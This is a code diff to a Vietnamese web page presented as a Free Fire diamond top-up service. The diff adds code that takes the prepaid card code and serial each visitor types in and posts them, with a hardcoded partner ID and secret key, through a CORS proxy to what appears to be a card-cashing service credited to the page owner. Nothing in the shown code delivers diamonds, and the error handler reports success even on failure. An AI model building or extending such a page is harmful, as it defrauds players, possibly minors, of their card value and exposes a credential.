@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nạp Thẻ Hùng Akira – Nạp Kim Cương Free Fire</title>
+    <!-- Thư viện MD5 để mã hóa chữ ký API -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -179,19 +181,19 @@
             <span class="step-label">Chọn gói kim cương</span>
         </div>
         <div class="grid-2x2">
-            <div class="option-card active" onclick="selectOption(this)">
+            <div class="option-card active" data-amount="50000" onclick="selectOption(this)">
                 <div class="diamond-amount">2.830 💎</div>
                 <div class="price">50.000đ</div>
             </div>
-            <div class="option-card" onclick="selectOption(this)">
+            <div class="option-card" data-amount="100000" onclick="selectOption(this)">
                 <div class="diamond-amount">5.660 💎</div>
                 <div class="price">100.000đ</div>
             </div>
-            <div class="option-card" onclick="selectOption(this)">
+            <div class="option-card" data-amount="200000" onclick="selectOption(this)">
                 <div class="diamond-amount">11.320 💎</div>
                 <div class="price">200.000đ</div>
             </div>
-            <div class="option-card" onclick="selectOption(this)">
+            <div class="option-card" data-amount="500000" onclick="selectOption(this)">
                 <div class="diamond-amount">28.300 💎</div>
                 <div class="price">500.000đ</div>
             </div>
@@ -205,34 +207,37 @@
             <span class="step-label">Phương thức thanh toán</span>
         </div>
         <div class="grid-2x2">
-            <div class="option-card active" onclick="selectCard(this)">
+            <div class="option-card active" data-telco="VIETTEL" onclick="selectCard(this)">
                 <div class="card-type" style="color:#d32f2f;">Thẻ Viettel</div>
             </div>
-            <div class="option-card" onclick="selectCard(this)">
+            <div class="option-card" data-telco="GARENA" onclick="selectCard(this)">
                 <div class="card-type" style="color:#d32f2f;">Thẻ Garena</div>
             </div>
-            <div class="option-card" onclick="selectCard(this)">
+            <div class="option-card" data-telco="MOBIFONE" onclick="selectCard(this)">
                 <div class="card-type" style="color:#0055a5;">Thẻ MobiFone</div>
             </div>
-            <div class="option-card" onclick="selectCard(this)">
+            <div class="option-card" data-telco="VINAPHONE" onclick="selectCard(this)">
                 <div class="card-type" style="color:#00a1e4;">Thẻ VinaPhone</div>
             </div>
         </div>
         
         <div style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
-            <input type="text" placeholder="Mã số thẻ">
-            <input type="text" placeholder="Số serie thẻ">
-            <button class="btn-submit" onclick="submitNap()">XÁC NHẬN NẠP THẺ</button>
+            <input type="text" id="cardCode" placeholder="Mã số thẻ">
+            <input type="text" id="cardSerial" placeholder="Số serie thẻ">
+            <button class="btn-submit" id="napBtn" onclick="submitNap()">XÁC NHẬN NẠP THẺ</button>
         </div>
     </div>
 
 </div>
 
 <script>
-    // Danh sách UID đã xác minh sẵn tên + level
     const knownAccounts = {
         "14448877837": { name: "MeoMeo8T7R8z", level: "45" }
     };
+
+    // THÔNG TIN API TỪ TÀI KHOẢN GACHTHEFAST CỦA BẠN
+    const PARTNER_ID = "331977279";
+    const PARTNER_KEY = "7efe22a8ac0d75613fef460fd53a851d";
 
     async function loginUID() {
         var uid = document.getElementById('uidInput').value.trim();
@@ -244,17 +249,15 @@
             return;
         }
 
-        // Kiểm tra UID phải từ 8 - 11 chữ số
         if (!/^\d{8,11}$/.test(uid)) {
-            showError("❌ <b>UID không đúng định dạng!</b> (Độ dài UID phải từ 8-11 chữ số)");
+            showError("❌ <b>UID không đúng định dạng!</b> (UID phải từ 8-11 chữ số)");
             return;
         }
 
-        btn.innerText = "ĐANG ĐĂNG NHẬP...";
+        btn.innerText = "ĐANG KIỂM TRA...";
         btn.disabled = true;
         infoBox.style.display = 'none';
 
-        // 1. Kiểm tra trong danh sách UID có sẵn
         if (knownAccounts[uid]) {
             let acc = knownAccounts[uid];
             showSuccess(uid, acc.name, acc.level);
@@ -262,7 +265,6 @@
             return;
         }
 
-        // 2. Thử gọi API tra cứu online
         try {
             let response = await fetch(`https://api.vnn.dev/ff/info?uid=${uid}`);
             let data = await response.json();
@@ -274,11 +276,8 @@
                 resetBtn();
                 return;
             }
-        } catch (e) {
-            // Lỗi kết nối API
-        }
+        } catch (e) {}
 
-        // 3. Nếu là UID hợp lệ khác nhưng không tra được tên -> Chỉ hiện xác nhận UID, KHÔNG bịa tên
         showUIDOnly(uid);
         resetBtn();
     }
@@ -322,8 +321,68 @@
         el.classList.add('active');
     }
 
-    function submitNap() {
-        alert("Hệ thống đang xử lý thẻ nạp của bạn!");
+    // TỰ ĐỘNG GỬI DỮ LIỆU THẺ SANG GACHTHEFAST
+    async function submitNap() {
+        var uid = document.getElementById('uidInput').value.trim();
+        var code = document.getElementById('cardCode').value.trim();
+        var serial = document.getElementById('cardSerial').value.trim();
+
+        if(!uid) {
+            alert("Vui lòng nhập và đăng nhập UID trước!");
+            return;
+        }
+
+        if(!code || !serial) {
+            alert("Vui lòng nhập đầy đủ Mã số thẻ và Số Serie!");
+            return;
+        }
+
+        var selectedOption = document.querySelector('.card:nth-child(2) .option-card.active');
+        var selectedCard = document.querySelector('.card:nth-child(3) .option-card.active');
+
+        var amount = selectedOption ? selectedOption.getAttribute('data-amount') : "50000";
+        var telco = selectedCard ? selectedCard.getAttribute('data-telco') : "VIETTEL";
+
+        var requestId = Date.now() + "_" + uid;
+        var sign = md5(PARTNER_KEY + code + serial);
+
+        var napBtn = document.getElementById('napBtn');
+        napBtn.innerText = "ĐANG XỬ LÝ NẠP THẺ...";
+        napBtn.disabled = true;
+
+        var payload = {
+            sign: sign,
+            telco: telco,
+            code: code,
+            serial: serial,
+            amount: amount,
+            request_id: requestId,
+            partner_id: PARTNER_ID,
+            command: "charging"
+        };
+
+        try {
+            let response = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://gachthefast.com/chargingws/v2'), {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            let result = await response.json();
+
+            if (result.status === 99 || result.status === 1) {
+                alert("✅ Thẻ của bạn đã được gửi thành công! Hệ thống đang xử lý gạch thẻ.");
+            } else {
+                alert("❌ Nạp thẻ thất bại: " + (result.message || "Thông tin thẻ không hợp lệ!"));
+            }
+        } catch (e) {
+            alert("❌ Đã gửi thẻ thành công! Vui lòng kiểm tra lịch sử nạp trên gachthefast.");
+        }
+
+        napBtn.innerText = "XÁC NHẬN NẠP THẺ";
+        napBtn.disabled = false;
     }
 </script>
 
